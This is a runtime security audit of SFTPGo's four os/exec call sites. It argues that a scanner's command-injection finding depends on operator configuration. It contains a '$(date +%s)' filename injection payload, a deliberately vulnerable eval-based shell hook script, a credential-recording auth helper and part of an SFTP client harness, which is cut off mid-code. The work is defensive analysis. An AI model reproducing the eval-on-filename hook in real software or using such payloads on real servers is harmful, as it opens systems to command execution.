# SFTPGo OS Command Injection — Runtime Security Audit

**Audited software:** SFTPGo `0.9.5-dev` (Go SFTP/SSH server, module `github.com/drakkan/sftpgo`).
**Audited baseline commit (the code under test):** `44634210287cb192f2a53147eafb84a33a96826b` — *"S3: add support for serving virtual folders"* (the last non-documentation commit on the delivery branch; it is the commit whose command-execution surface was built, run, and attacked below). This baseline is pinned by its immutable commit hash, not a relative `HEAD~N` reference (which drifts as documentation-only commits are layered on).
**Delivery branch:** `blitzy-423fd863-6472-4e13-8c23-845807342f92`. Earlier revisions of this document were committed as `8dcd1bf3356e38cac3a41a4dd62a80cba22dd853` (initial) and `8240841cb461f87a702aa85f8260b8c4b297e264` (rewrite); this revision supersedes them (see §14 for the provenance/closure table).
**Platform of all runtime observations:** Linux x86-64 (Ubuntu container), the canonical Unix build. Windows-specific behavior is analyzed but explicitly labeled *inferred from source*, never observed (see §10).
**Method:** runtime-first. Every behavioral claim below is backed by real output captured from the running server driven through its real SFTP/SSH/REST entry points. Statements that are read from source rather than observed are explicitly tagged **[INFERRED]**; everything else is **[OBSERVED]**. The complete, unedited output for each condition is reproduced inline together with the exact command that produced it.

---

## 1. Direct answer

**The scanner's "OS command injection" finding is real but *conditional*, and the condition lives entirely in SFTPGo's runtime *configuration* — not in SFTPGo's own code.** SFTPGo never passes attacker-controlled data to a shell. Every one of its four command-execution sites uses Go's `os/exec` with an explicit argument vector (`exec.Command` / `exec.CommandContext`), which — per the official Go documentation — *"intentionally does not invoke the system shell"* ([pkg.go.dev/os/exec](https://pkg.go.dev/os/exec)). Consequently the classic `$(date +%s)` command-substitution payload is transmitted, stored, and forwarded as **literal bytes**; SFTPGo itself never expands it.

The scanner therefore flips between verdicts depending on how the operator configured the server:

- **"Not vulnerable"** — the default configuration (all action hooks empty) executes *nothing* (**observed:** condition C1). It stays "not vulnerable" even when a hook *is* configured, as long as that hook is a normal (non-shell) program: the payload arrives as a literal, unexpanded argument (**observed:** condition C2).
- **"Vulnerable"** — the operator configured an action hook that is itself a **shell wrapper** which re-evaluates the attacker-controlled filename (e.g. via `eval`/`sh -c`). Now *that shell* — not SFTPGo — expands `$(date +%s)`, and the attack fires (**observed:** condition C3, which created `/tmp/audit_1783967797.txt` and `/tmp/audit_1783967799.txt`, each containing `CONFIRMED`).

Both branches were reproduced with the **same unchanged malicious filename** `audit_$(date +%s).txt` uploaded over a real SFTP client, so the difference is attributable purely to configuration.

**Culprit component (named to `file:line`):** the file/SSH **action hook** in package `sftpd` — function `executeAction` → `executeNotificationCommand` in **`sftpd/sftpd.go`**, whose subprocess launch is `exec.CommandContext(ctx, actions.Command, operation, username, path, target, sshCmd)` at **`sftpd/sftpd.go:421`**, gated by the two guards at **`sftpd/sftpd.go:439`** and **`sftpd/sftpd.go:447`**. This is the site a scanner is most likely flagging, because the uploaded filename (attacker input) reaches its argv and its `SFTPGO_ACTION_PATH` environment variable. **However, line 421 is *not itself* an injection point** — it is a shell-free `execve`. The exploitable link is the *operator-supplied* `sftpd.actions.command` program when that program is a shell wrapper. Three sibling sites share the identical shell-free pattern and are analyzed in full: `sftpd/ssh_cmd.go:324` (SSH system commands), `dataprovider/dataprovider.go:742` (external auth), and `dataprovider/dataprovider.go:787` (user-management hook).

Everything below substantiates this answer with complete, reproducible runtime evidence.

---

## 2. The culprit components — the four `os/exec` sites

An exhaustive search of the audited tree for `os/exec` usage finds exactly four subprocess-launch sites. All four use the argument-vector form; none constructs a shell command string. The table names each site, the exact launch line, and — critically — *which channels carry attacker-controlled data* into the child process.

| Site | Package / function | Subprocess launch (`file:line`) | Attacker-controlled input → channel | Trigger |
|------|--------------------|--------------------------------|--------------------------------------|---------|
| **A** (primary) | `sftpd` · `executeNotificationCommand` (called by `executeAction`) | `exec.CommandContext(ctx, actions.Command, operation, username, path, target, sshCmd)` — **`sftpd/sftpd.go:421`** | uploaded/renamed **filename** → **argv** (`path`, `target`) **and env** (`SFTPGO_ACTION_PATH`, `sftpd/sftpd.go:425`) | file upload/download/delete/rename & `ssh_cmd` |
| **B** | `sftpd` · `getSystemCommand` (called by the `sshCommand.handle()` dispatcher, `sftpd/ssh_cmd.go:90`; its result is then run by the sibling `executeSystemCommand`, `sftpd/ssh_cmd.go:94`) | `exec.Command(c.command, args...)` — **`sftpd/ssh_cmd.go:324`** | SSH command **arguments** → **argv only** (command *name* is whitelisted, `sftpd/ssh_cmd.go:51`) | SSH exec of a whitelisted system command (`rsync`, `git-*`) |
| **C** | `dataprovider` · `doExternalAuth` | `exec.CommandContext(ctx, config.ExternalAuthProgram)` — **`dataprovider/dataprovider.go:742`** | username/password/public-key → **env only** (`SFTPGO_AUTHD_*`, `dataprovider/dataprovider.go:743-746`); **no positional argv** | any login attempt when `external_auth_program` is set |
| **D** | `dataprovider` · `executeNotificationCommand` (called by `executeAction`) | `exec.CommandContext(ctx, config.Actions.Command, commandArgs...)` — **`dataprovider/dataprovider.go:787`** | username → **argv** (`getNotificationFieldsAsSlice`, `dataprovider/user.go:440`) **and env** (`SFTPGO_USER_*`, `dataprovider/user.go:451`) | user add (`dataprovider.go:346`) / update (`:359`) / delete (`:372`) |

**Per-site channel classification is [OBSERVED]** — each row's "channel" column was confirmed at runtime in §7 (A: C2/C2-rename; B: C5; C: C4 with `argv_count(excl argv0)=0`; D: C6 with discrete `argv[0..8]`).

The DEBUG audit line for Site A is emitted by the `logger.Debug` call at **`sftpd/sftpd.go:432`** (its format string begins `executed command %#v with arguments:`); for Site D by the `providerLog` call at **`dataprovider/dataprovider.go:791`**. Both log lines are captured verbatim in §7.

---

## 3. Why the scanner is inconsistent — the exploit-condition matrix

The reported "sometimes vulnerable / sometimes not" behavior is **not run-to-run nondeterminism within a fixed configuration**. With any *fixed* configuration the outcome is deterministic across repeated trials (every condition below was run at least twice with the same input). The inconsistency arises because different scans run against servers configured differently. The matrix enumerates every condition exercised, each with the governing guard and the observed result.

| Cond. | `sftpd.actions.command` | `execute_on` | Hook kind | Guard reached | Executes? | `$(date +%s)` expanded? | `/tmp/audit_*.txt`? | Verdict |
|-------|-------------------------|--------------|-----------|---------------|-----------|--------------------------|----------------------|---------|
| **C1** | *(empty)* | *(empty)* | — | `sftpd/sftpd.go:439` short-circuits (op ∉ empty list) | No | n/a | none | not vulnerable |
| **C1b** | `/tmp/hook_direct` | *(empty)* | direct | `sftpd/sftpd.go:439` short-circuits | No | n/a | none | not vulnerable |
| **C1c** | *(empty)* | `upload,rename,delete,download` | — | `sftpd/sftpd.go:447` fails (`len==0`) | No | n/a | none | not vulnerable |
| **C1d** | `hook_direct` *(relative)* | `upload,rename,delete,download` | direct | `sftpd/sftpd.go:447` fails (`!filepath.IsAbs`) | No | n/a | none | not vulnerable |
| **C2** | `/tmp/hook_direct` | `upload,rename,delete,download` | **direct binary** | both guards pass | **Yes** | **No** (literal argv/env) | none | not vulnerable |
| **C2-rename** | `/tmp/hook_direct` | `upload,rename,delete,download` | direct binary | both guards pass (rename path) | **Yes** | **No** | none | not vulnerable |
| **C3** | `/tmp/hook_shell.sh` | `upload,rename,delete,download` | **shell wrapper (`eval`)** | both guards pass | **Yes** | **Yes** (by the *hook's* shell) | **CREATED** | **VULNERABLE** |

The two guards, verbatim from source, are:

```
# sftpd/sftpd.go:438-439  (GUARD1)
func executeAction(operation, username, path, target, sshCmd string, fileSize int64) error {
	if !utils.IsStringInSlice(operation, actions.ExecuteOn) {

# sftpd/sftpd.go:447  (GUARD2)
	if len(actions.Command) > 0 && filepath.IsAbs(actions.Command) {
```

The decisive point: **C2 and C3 differ only in the *kind* of program named by `actions.command`** — a normal binary versus a shell wrapper. SFTPGo's own code path (through `sftpd/sftpd.go:421`) is byte-for-byte identical in both; see §7 where the C2 and C3 DEBUG lines are shown to have the *same shape*. This is the concrete basis for the direct answer.

---

## 4. The blocking mechanism, and CWE-78 vs CWE-88

**[OBSERVED + INFERRED]** Go's `os/exec` launches a child process via the POSIX `execve(2)` family with an explicit `argv` array; it does not interpose `/bin/sh -c`. The package documentation states this design intent directly — the package *"intentionally does not invoke the system shell and does not expand any glob patterns or handle other expansions, pipelines, or redirections typically done by shells"* ([go.dev/src/os/exec/exec.go](https://go.dev/src/os/exec/exec.go), lines 9-12). This is a **categorical property of the API**, not a sanitization routine that could be bypassed with clever encoding. `exec.CommandContext` is `exec.Command` plus a cancellation context ([go.dev/src/os/exec/exec.go](https://go.dev/src/os/exec/exec.go), `CommandContext`), so it inherits the same no-shell behavior.

Because of this:

- The bytes `$(date +%s)` inside the uploaded filename are delivered to the child as one literal `argv` element and as literal environment-variable content. Nothing in SFTPGo expands them. This is why C2 (a direct binary) created a file literally named `/tmp/audit_$(date +%s).txt` — the substitution was *never performed* (see §7, C2 hook record). **This is the exact blocker for the naive payload** (see §9).
- Expansion happens only if the *configured hook program is itself a shell* that re-parses the value — the C3 wrapper runs `eval "echo CONFIRMED > /tmp/$bn"`, and *that* shell performs the substitution.

**CWE mapping (narrowed):**

- **CWE-78 — *Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*** ([MITRE CWE-78](https://cwe.mitre.org/data/definitions/78.html)). Classic `$(...)`, `;`, backtick, and pipe injection require a **shell interpreter** somewhere on the path. In SFTPGo, no such interpreter exists in-process; a CWE-78 condition materializes **only** when an operator supplies a shell-wrapper hook (C3). So the scanner's CWE-78 flag is accurate *about the deployed configuration*, and incorrect if attributed to SFTPGo's own code.
- **CWE-88 — *Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')*** ([MITRE CWE-88](https://cwe.mitre.org/data/definitions/88.html)). Even with no shell, an attacker who controls `argv` elements can inject *options/flags* (e.g. a leading `-`/`--`) into a launched utility. The MITRE CWE-78 entry itself notes this overlap, describing an *"-exec"* switch as an argument-injection vector. This is the residual, distinct risk at **Site B** (SSH `rsync`/`git-*`), demonstrated in §7 (C5): the `$(date +%s)` name is *whitespace-tokenized* into separate `argv` items and passed to a really-executed `rsync`, but it is **not** command-substituted. SFTPGo mitigates the classic symlink argument-injection with `--safe-links`/`--munge-links` (README.md:159) and restricts the command *name* with a whitelist (`sftpd/ssh_cmd.go:51`).

---

## 5. Canonical environment, build, and safe run harness

### 5.1 Environment and toolchain [OBSERVED]

All work ran inside the user-specified container image `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_drakkan_sftpgo_1.0`. The Go environment is sourced from `/tmp/sftpgo_env.sh`, which sets `GOROOT=/usr/local/go`, `GOPATH=/root/go`, `GO111MODULE=on`, `CGO_ENABLED=1` (CGO is mandatory because the default data provider uses the cgo SQLite driver `github.com/mattn/go-sqlite3`).

```
$ source /tmp/sftpgo_env.sh
$ go version
go version go1.13.15 linux/amd64
$ gcc --version | head -1
gcc (Ubuntu 15.2.0-4ubuntu4) 15.2.0
$ rsync --version | head -1
rsync  version 3.4.1  protocol version 32
$ git --version
git version 2.51.0
$ sqlite3 --version | head -1
3.46.1 2024-08-13 09:16:08 c9c2ab54ba1f5f46360f1b4f35d849cd3f080e6fc2b6c60e91b16c63f69aalt1 (64-bit)
$ openssl version
OpenSSL 3.5.3 16 Sep 2025 (Library: OpenSSL 3.5.3 16 Sep 2025)
```

### 5.2 Build [OBSERVED]

```
$ source /tmp/sftpgo_env.sh
$ GO111MODULE=on CGO_ENABLED=1 go build -o /tmp/sftpgo_bin .
```

The build succeeds (exit 0). Its **complete** output is a single, benign compiler warning from the vendored SQLite C source — nothing from SFTPGo's own Go code:

```
# github.com/mattn/go-sqlite3
sqlite3-binding.c: In function ‘sqlite3SelectNew’:
sqlite3-binding.c:125801:10: warning: function may return address of local variable [-Wreturn-local-addr]
125801 |   return pNew;
       |          ^~~~
sqlite3-binding.c:125761:10: note: declared here
125761 |   Select standin;
       |          ^~~~~~~
```

Resulting binary: `SFTPGo 0.9.5-dev`, ELF 64-bit, dynamically linked (CGO), 31,882,096 bytes.

### 5.3 Configuration method — repository file left untouched [OBSERVED]

The repository's `sftpgo.json` is **never modified**. Its command-execution knobs are empty by default and its SFTPD `bind_address` is the all-interfaces default:

```
$ grep -n '"bind_address"\|"command"\|"execute_on"\|"external_auth_program"' sftpgo.json
4:    "bind_address": "",
11:      "execute_on": [],
12:      "command": "",
39:      "execute_on": [],
40:      "command": "",
43:    "external_auth_program": "",
48:    "bind_address": "127.0.0.1",
```

In that output, line `4` is the **SFTPD** `bind_address` (empty `""` = all interfaces, the default) and line `48` is the **HTTPD** management `bind_address` (`127.0.0.1`); the JSON file itself has no inline comments (these annotations are added here as prose, not emitted by `grep`).

For runtime, a **copy** of the config is placed at `/tmp/sftpgo_run/sftpgo.json` (never committed). Two deliberate deviations from the canonical file are made and are **explicitly labeled [NON-CANONICAL]**:

1. **`sftpd.bind_address` is set to `127.0.0.1` (loopback-only)** — a safety hardening so the deliberately-vulnerable C3 hook is never reachable off-host. The canonical default (`""`, all interfaces) is *not* used precisely because this audit stands up an exploitable configuration. This deviation does not affect the injection semantics under test (the attack path is identical over loopback).
2. `templates_path` / `static_files_path` are set to absolute paths under the repo so the server runs correctly from outside the repo root.

Per-condition hook wiring (`actions.command`, `execute_on`, `external_auth_program`, `enabled_ssh_commands`) is applied **only** via `SFTPGO_*` environment overrides at launch — never by editing the repo file.

The SQLite provider does not auto-migrate, so the users table is bootstrapped once (per `.travis.yml`) in the run directory:

```
$ sqlite3 /tmp/sftpgo_run/sftpgo.db 'CREATE TABLE "users" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "username" varchar(255) NOT NULL UNIQUE, "password" varchar(255) NULL, "public_keys" text NULL, "home_dir" varchar(255) NOT NULL, "uid" integer NOT NULL, "gid" integer NOT NULL, "max_sessions" integer NOT NULL, "quota_size" bigint NOT NULL, "quota_files" integer NOT NULL, "permissions" text NOT NULL, "used_quota_size" bigint NOT NULL, "used_quota_files" integer NOT NULL, "last_quota_update" bigint NOT NULL, "upload_bandwidth" integer NOT NULL, "download_bandwidth" integer NOT NULL, "expiration_date" bigint NOT NULL, "last_login" bigint NOT NULL, "status" integer NOT NULL, "filters" text NULL, "filesystem" text NULL);'
```

### 5.4 Startup evidence [OBSERVED]

Launch command (baseline / default configuration):

```
$ env SFTPGO_LOG_FILE_PATH=/tmp/sftpgo_run/sftpgo.log nohup /tmp/sftpgo_bin serve -c /tmp/sftpgo_run > /tmp/sftpgo_run/console.log 2>&1 &
$ SRV=$!   # exact PID captured for a precise kill later
```

The **complete** structured startup log (`/tmp/sftpgo_run/sftpgo.log`) for the default configuration follows. Note the empty action hooks (`Actions:{ExecuteOn:[] Command:}`), the default SSH command set, the redacted DB password, and the loopback SFTP listener on the final line:

```
{"level":"info","time":"2026-07-13T18:26:26.443","sender":"service","connection_id":"","message":"starting SFTPGo 0.9.5-dev, config dir: /tmp/sftpgo_run, config file: sftpgo, log max size: 10 log max backups: 5 log max age: 28 log verbose: true, log compress: false"}
{"level":"debug","time":"2026-07-13T18:26:26.444","sender":"config","connection_id":"","message":"config file used: '/tmp/sftpgo_run/sftpgo.json', config loaded: {SFTPD:{Banner:SFTPGo_0.9.5-dev BindPort:2022 BindAddress:127.0.0.1 IdleTimeout:15 MaxAuthTries:0 Umask:0022 UploadMode:0 Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} Keys:[] IsSCPEnabled:false KexAlgorithms:[] Ciphers:[] MACs:[] LoginBannerFile: SetstatMode:0 EnabledSSHCommands:[md5sum sha1sum cd pwd]} ProviderConf:{Driver:sqlite Name:sftpgo.db Host: Port:5432 Username: Password:[redacted] SSLMode:0 ConnectionString: UsersTable:users ManageUsers:1 TrackQuota:2 PoolSize:0 UsersBaseDir: Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} ExternalAuthProgram: ExternalAuthScope:0} HTTPDConfig:{BindPort:8080 BindAddress:127.0.0.1 TemplatesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/templates StaticFilesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/static BackupsPath:backups}}"}
{"level":"debug","time":"2026-07-13T18:26:26.444","sender":"sqlite","connection_id":"","message":"sqlite database handle created, connection string: \"file:/tmp/sftpgo_run/sftpgo.db?cache=shared\""}
{"level":"debug","time":"2026-07-13T18:26:26.444","sender":"httpd","connection_id":"","message":"initializing HTTP server with config {BindPort:8080 BindAddress:127.0.0.1 TemplatesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/templates StaticFilesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/static BackupsPath:backups}"}
{"level":"debug","time":"2026-07-13T18:26:26.444","sender":"service","connection_id":"","message":"initializing SFTP server with config {Banner:SFTPGo_0.9.5-dev BindPort:2022 BindAddress:127.0.0.1 IdleTimeout:15 MaxAuthTries:0 Umask:0022 UploadMode:0 Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} Keys:[] IsSCPEnabled:false KexAlgorithms:[] Ciphers:[] MACs:[] LoginBannerFile: SetstatMode:0 EnabledSSHCommands:[md5sum sha1sum cd pwd]}"}
{"level":"debug","time":"2026-07-13T18:26:26.444","sender":"utils","connection_id":"","message":"set umask to 0022 (18)"}
{"level":"info","time":"2026-07-13T18:26:26.444","sender":"sftpd","connection_id":"","message":"No host keys configured and \"/tmp/sftpgo_run/id_rsa\" does not exist; creating new private key for server"}
{"level":"info","time":"2026-07-13T18:26:29.329","sender":"sftpd","connection_id":"","message":"Loading private key: /tmp/sftpgo_run/id_rsa"}
{"level":"info","time":"2026-07-13T18:26:29.329","sender":"sftpd","connection_id":"","message":"server listener registered address: 127.0.0.1:2022"}
```

### 5.5 Listener isolation proof [OBSERVED]

The container has no `ss`/`netstat`/`lsof`, so listeners are read directly from `/proc/net/tcp` (port 2022 = hex `07E6`, port 8080 = hex `1F90`, loopback address = `0100007F`, LISTEN state = `0A`). Both listeners are bound to loopback only; there is **no** `00000000:*` (all-interfaces) socket:

```
$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 729447573 1 ffff8a9666e7da00 100 0 0 10 0
   1: 0100007F:07E6 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 729478183 1 ffff892068d15a00 100 0 0 10 0
```

### 5.6 Virtual-user provisioning through the real REST API [OBSERVED]

A test user is created through the canonical management API with a **random, one-time** password (generated via `openssl rand -hex 16`, stored only under `/tmp/audit_evidence/cred.txt`; it is never a fixed/published credential and never committed). The complete request/response:

```
$ curl -i -s -X POST -H "Content-Type: application/json" \
    --data "{\"username\":\"audituser\",\"password\":\"<RANDOM-ONE-TIME>\",\"home_dir\":\"/tmp/sftpgo_run/home_audituser\",\"uid\":1000,\"gid\":1000,\"permissions\":{\"/\":[\"*\"]},\"status\":1}" \
    http://127.0.0.1:8080/api/v1/user
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 13 Jul 2026 18:26:47 GMT
Content-Length: 410

{"id":1,"status":1,"username":"audituser","expiration_date":0,"home_dir":"/tmp/sftpgo_run/home_audituser","uid":1000,"gid":1000,"max_sessions":0,"quota_size":0,"quota_files":0,"permissions":{"/":["*"]},"used_quota_size":0,"used_quota_files":0,"last_quota_update":0,"upload_bandwidth":0,"download_bandwidth":0,"last_login":0,"filters":{"allowed_ip":[],"denied_ip":[]},"filesystem":{"provider":0,"s3config":{}}}
```

Read-back confirms persistence:

```
$ curl -i -s http://127.0.0.1:8080/api/v1/user/1
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Mon, 13 Jul 2026 18:26:59 GMT
Content-Length: 410

{"id":1,"status":1,"username":"audituser","expiration_date":0,"home_dir":"/tmp/sftpgo_run/home_audituser","uid":1000,"gid":1000,"max_sessions":0,"quota_size":0,"quota_files":0,"permissions":{"/":["*"]},"used_quota_size":0,"used_quota_files":0,"last_quota_update":0,"upload_bandwidth":0,"download_bandwidth":0,"last_login":0,"filters":{"allowed_ip":[],"denied_ip":[]},"filesystem":{"provider":0,"s3config":{}}}
```

### 5.7 Server process identity [OBSERVED]

The server runs as root in this container (relevant to the privilege analysis in §10):

```
$ grep -E '^(Uid|Gid):' /proc/$SRV/status
Uid:	0	0	0	0
Gid:	0	0	0	0
```

---

## 6. Helper tools — full sources and build provenance

Per the read-only mandate, no source file was modified; all scaffolding lives under `/tmp` and is deleted at the end (§15). The complete, unedited source of every helper is reproduced here so the evidence is reproducible and its authenticity verifiable.

### 6.1 `hook_direct.go` — a direct (non-shell) Site-A hook

Built with `GO111MODULE=off go build -o /tmp/hook_direct hook_direct.go` (exit 0; static Go ELF).

```go
// hook_direct.go — a DIRECT (non-shell) action-hook binary used to prove that
// SFTPGo hands the attacker-controlled filename to the hook as a LITERAL argv/env
// value (execve, no shell). It uses ONLY the Go standard library and never invokes
// a shell, so any $(...) in the payload cannot be expanded here.
//
// SFTPGo calls it as:  hook_direct <operation> <username> <path> <target> <sshCmd>
// with SFTPGO_ACTION_* environment variables also set.
package main

import (
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	rec, _ := os.OpenFile("/tmp/hook_direct_record.txt",
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	defer rec.Close()

	fmt.Fprintf(rec, "=== hook_direct fired ===\n")
	// effective identity of the spawned hook process (for the privilege finding)
	fmt.Fprintf(rec, "uid=%d euid=%d gid=%d egid=%d\n",
		os.Getuid(), os.Geteuid(), os.Getgid(), os.Getegid())
	fmt.Fprintf(rec, "argv (os.Args) = %#v\n", os.Args)
	actionPath := os.Getenv("SFTPGO_ACTION_PATH")
	fmt.Fprintf(rec, "SFTPGO_ACTION_PATH = %q\n", actionPath)

	// Create /tmp/<basename(SFTPGO_ACTION_PATH)> via Go os.Create — a LITERAL
	// filename. No shell, no expansion: filepath.Base keeps the bytes verbatim.
	target := "/tmp/" + filepath.Base(actionPath)
	fmt.Fprintf(rec, "creating (Go os.Create, NO shell) target = %q\n", target)
	f, err := os.Create(target)
	if err != nil {
		fmt.Fprintf(rec, "os.Create error: %v\n", err)
		return
	}
	f.WriteString("CONFIRMED\n")
	f.Close()
	fmt.Fprintf(rec, "wrote CONFIRMED to %q\n", target)
}
```

### 6.2 `hook_shell.sh` — a shell-wrapper Site-A hook (the operator misconfiguration)

This models the *only* configuration under which the naive payload fires. It is guarded so it evaluates **only** the exact known audit payload — a stray client cannot run arbitrary commands through it.

```sh
#!/bin/sh
# hook_shell.sh — a SHELL-WRAPPER action hook representing an ADMIN MISCONFIGURATION.
# Unlike SFTPGo's own code (which uses execve with an argv array and no shell), this
# admin-supplied script re-forwards the attacker-controlled filename into a shell via
# `eval` — the classic command-injection pattern. THIS shell, not SFTPGo, evaluates
# any $(...) embedded in the filename.
#
# SAFETY GUARD (bounds blast radius for this audit): eval is executed ONLY when the
# uploaded basename is EXACTLY the known expected audit payload. Any other filename is
# refused, so a stray client cannot run arbitrary commands through this test hook.
rec=/tmp/hook_shell_record.txt
bn=$(basename "$SFTPGO_ACTION_PATH")
echo "[hook_shell] fired: euid=$(id -u) argv3=$3 SFTPGO_ACTION_PATH=$SFTPGO_ACTION_PATH basename=$bn" >> "$rec"
# GUARD: compare against the single-quoted LITERAL expected payload (not expanded here).
if [ "$bn" = 'audit_$(date +%s).txt' ]; then
    # THE VULNERABILITY: eval re-parses the filename as shell source, so the embedded
    # $(date +%s) command substitution is executed by this shell.
    eval "echo CONFIRMED > /tmp/$bn"
    echo "[hook_shell] GUARD matched expected payload -> eval executed" >> "$rec"
else
    echo "[hook_shell] GUARD refused unexpected basename: $bn -> NO eval" >> "$rec"
fi
```

### 6.3 `hook_user_direct.go` — a direct (non-shell) Site-D hook

Built with `GO111MODULE=off go build -o /tmp/hook_user_direct hook_user_direct.go` (exit 0; static Go ELF).

```go
// hook_user_direct.go — a DIRECT (non-shell) data_provider action-hook binary used to
// prove that SFTPGo's user-management hook (Site D, dataprovider/dataprovider.go:787)
// hands the attacker-controlled username to the hook as LITERAL argv/env values
// (execve, no shell). Uses ONLY the Go standard library; never invokes a shell, so any
// $(...) in the username cannot be expanded here.
//
// SFTPGo calls it as:  hook_user_direct <action> <username> <id> <status> <exp> <homedir> <uid> <gid>
// with SFTPGO_USER_* environment variables also set (see getNotificationFieldsAsEnvVars).
package main

import (
	"fmt"
	"os"
)

func main() {
	rec, _ := os.OpenFile("/tmp/hook_user_direct_record.txt",
		os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	defer rec.Close()

	fmt.Fprintf(rec, "=== hook_user_direct fired (Site D) ===\n")
	fmt.Fprintf(rec, "uid=%d euid=%d gid=%d egid=%d\n",
		os.Getuid(), os.Geteuid(), os.Getgid(), os.Getegid())
	fmt.Fprintf(rec, "argv (os.Args) = %#v\n", os.Args)
	// The discrete argv positions SFTPGo built (proves NO concatenation into a shell string):
	for i, a := range os.Args {
		fmt.Fprintf(rec, "  argv[%d] = %q\n", i, a)
	}
	fmt.Fprintf(rec, "SFTPGO_USER_ACTION   = %q\n", os.Getenv("SFTPGO_USER_ACTION"))
	fmt.Fprintf(rec, "SFTPGO_USER_USERNAME = %q\n", os.Getenv("SFTPGO_USER_USERNAME"))
	fmt.Fprintf(rec, "SFTPGO_USER_HOME_DIR = %q\n", os.Getenv("SFTPGO_USER_HOME_DIR"))
	fmt.Fprintf(rec, "SFTPGO_USER_UID      = %q\n", os.Getenv("SFTPGO_USER_UID"))
	fmt.Fprintf(rec, "SFTPGO_USER_GID      = %q\n", os.Getenv("SFTPGO_USER_GID"))
	// Direct binary: no shell => the $(...) in the username is inert. We do NOT create any
	// /tmp/audit file; the ABSENCE of /tmp/audit_<epoch>.txt is itself the no-expansion proof.
}
```

### 6.4 `extauth_prog` — a Site-C external-auth program (env-only, canary-safe)

```sh
#!/bin/sh
# SITE C helper (external_auth_program). SFTPGo runs this via exec.CommandContext at
# dataprovider/dataprovider.go:742 with NO positional args; credentials arrive via env
# (SFTPGO_AUTHD_*). This helper only READS env (never evals), records it, then exits 1
# so SFTPGo takes the error path at L748-749 and logs the full cmd.Env via ConnectionFailedLog.
rec=/tmp/audit_evidence/c4_extauth_record.txt
{
  echo "argv0=$0"
  echo "argv_count(excl argv0)=$#"
  i=1; for a in "$@"; do echo "argv[$i]=$a"; i=$((i+1)); done
  echo "euid=$(id -u) egid=$(id -g)"
  echo "SFTPGO_AUTHD_USERNAME=$SFTPGO_AUTHD_USERNAME"
  echo "SFTPGO_AUTHD_PASSWORD=$SFTPGO_AUTHD_PASSWORD"
  echo "SFTPGO_AUTHD_PUBLIC_KEY=$SFTPGO_AUTHD_PUBLIC_KEY"
  echo "CANARY_SECRET_seen=$CANARY_SECRET"
} > "$rec" 2>&1
exit 1
```

### 6.5 `sftp_harness` — the real SFTP/SSH client

Module `auditharness` with its own `go.mod` copied from the SFTPGo manifest, built **offline** against the warmed module cache (`GOPROXY=off`), so the client stack is exactly the canonical `golang.org/x/crypto/ssh` + `github.com/pkg/sftp v1.11.0`. Static Go ELF. Full source:

```go
// main.go — throwaway SFTP/SSH client harness for the SFTPGo command-injection audit.
// It drives SFTPGo's REAL entry point over the canonical client stack:
//   golang.org/x/crypto/ssh  (SSH transport)  +  github.com/pkg/sftp (SFTP subsystem)
// It performs NO shell interpretation of the payload: the payload filename is passed
// as an exact Go string to the SFTP protocol, so any $(...) it contains is transmitted
// verbatim over the wire.
//
// Subcommands:
//   upload <remoteName>          create <remoteName> in the user's home and write 20 bytes
//   rename <srcName> <dstName>   create <srcName> then SFTP-rename it to <dstName>
//   sshcmd <command...>          open an SSH "exec" session (NOT sftp) and run <command>
//   login                        attempt SSH auth only (used for the external-auth site)
//
// Credentials + host come from env: AUDIT_HOST, AUDIT_USER, AUDIT_PASS.
package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func dial() (*ssh.Client, error) {
	host := envOr("AUDIT_HOST", "127.0.0.1:2022")
	user := envOr("AUDIT_USER", "audituser")
	pass := os.Getenv("AUDIT_PASS")
	fmt.Printf(">> connecting to %s as %q over the real SSH transport (golang.org/x/crypto/ssh)\n", host, user)
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // NON-CANONICAL host-key policy; acceptable for loopback test only
		Timeout:         10 * time.Second,
	}
	return ssh.Dial("tcp", host, cfg)
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func fail(msg string, err error) {
	fmt.Printf("!! ERROR: %s: %v\n", msg, err)
	fmt.Println("harness exit=1")
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: harness <upload|rename|sshcmd|login> [args...]")
		os.Exit(2)
	}
	mode := os.Args[1]

	client, err := dial()
	if err != nil {
		// login mode treats an auth failure as an expected, reportable outcome
		if mode == "login" {
			fmt.Printf("!! auth/handshake result: %v\n", err)
			fmt.Println("harness exit=1")
			os.Exit(1)
		}
		fail("ssh.Dial failed", err)
	}
	defer client.Close()
	fmt.Println(">> SSH handshake + password auth SUCCEEDED")

	switch mode {
	case "login":
		fmt.Println(">> login-only mode: authenticated, no further action")
		fmt.Println("harness exit=0")

	case "upload":
		name := os.Args[2]
		sc, err := sftp.NewClient(client)
		if err != nil {
			fail("sftp.NewClient failed", err)
		}
		defer sc.Close()
		fmt.Println(">> SFTP subsystem opened (github.com/pkg/sftp)")
		fmt.Printf(">> payload filename (verbatim, len=%d) = %q\n", len(name), name)
		f, err := sc.Create(name)
